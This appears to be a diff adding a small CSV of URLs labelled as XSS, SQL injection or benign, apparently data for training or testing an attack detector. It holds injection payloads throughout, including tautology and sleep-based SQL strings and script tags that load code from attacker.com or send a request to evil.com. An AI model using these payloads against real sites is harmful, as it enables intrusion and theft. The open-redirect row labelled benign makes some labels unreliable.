@@ -1,0 +1,21 @@
+url,label
+"http://example.com?q=<script>alert('test')</script>",xss
+"http://vuln.io/?search=<IMG SRC=javascript:alert('XSS')>",xss
+"http://news.com/article?id=' OR 'a'='a",sql_injection
+"http://online.com/login?user=admin'--&pass=",sql_injection
+"http://legit.com/view?ref=home",benign
+"http://safe.shop.com/item?id=123",benign
+"http://form.io/?comment=<svg onload=alert(99)>",xss
+"http://data.com/api?user=' OR 1=1#",sql_injection
+"http://update.example.com/?next=dashboard",benign
+"http://redirect.me/?next=http://evil.com",benign
+"http://target.in/?value=<iframe src='javascript:alert(1)'>",xss
+"http://test.net/search?q=test'%20OR%20'1'%20=%20'1",sql_injection
+"http://shop.org/products?name=shoes",benign
+"http://xss.trap.com/input=<script>new Image().src='http://evil.com'</script>",xss
+"http://demo.site/?input=<object data=javascript:alert('x')>",xss
+"http://myapp.org/user?id=10 AND 1=1",sql_injection
+"http://info.page.com/data=<body onload=alert('xss')>",xss
+"http://library.net/book?id=4321",benign
+"http://api.org/auth?name=' OR sleep(5)#",sql_injection
+"http://click.site.com/?a=<script src=http://attacker.com/xss.js></script>",xss
